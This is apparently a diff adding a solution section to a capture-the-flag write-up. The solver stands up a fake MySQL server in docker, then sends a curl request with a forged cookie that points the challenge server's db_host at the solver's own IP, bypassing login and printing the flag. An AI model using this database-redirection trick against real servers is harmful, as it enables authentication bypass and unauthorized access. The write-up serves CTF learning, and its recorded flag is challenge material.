@@ -172,3 +172,25 @@ if __name__ == '__main__':
     print 'Starting server, use <Ctrl-C> to stop'
     server.serve_forever()
 ```
+
+## Solution
+
+Saw that the secret was 'x' looking at my /etc/passwd... so what was needed to fool the server was to set up a false db server that could authenticate my petition and redirect the server request to my db
+
+```
+docker pull mysql
+docker run --name tuenti-mysql -e MYSQL_ROOT_PASSWORD=pass -p 3306:3306 -d mysql
+mysql -h 127.0.0.1 -uroot -ppass <<COMM
+CREATE DATABASE hsl;
+USE hsl;
+CREATE TABLE users ( name text, passwd text);
+INSERT INTO users(name, passwd) VALUES('user', 'pass');
+COMM
+# 46.136.200.28 is my external ip at the time
+curl 'http://52.49.91.111:5252/' -H 'Host: 52.49.91.111:5252' -H 'User-Agent: Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Referer: http://52.49.91.111:5252/' -H 'Cookie: sig=913766141341b2a2033fade7f858c7c5; config=app_name%3Dhsl%26db_name%3Dhsl%26db_user%3Droot%26db_passwd%3Dpass%26db_host%3D46.136.200.28' -H 'Connection: keep-alive' -H 'Content-Type: application/x-www-form-urlencoded' --data 'user=user&password=pass&submit=Submit+Query'
+```
+
+then got key!!
+```
+0d466d89659fa902d0b154af89f381cd
+```
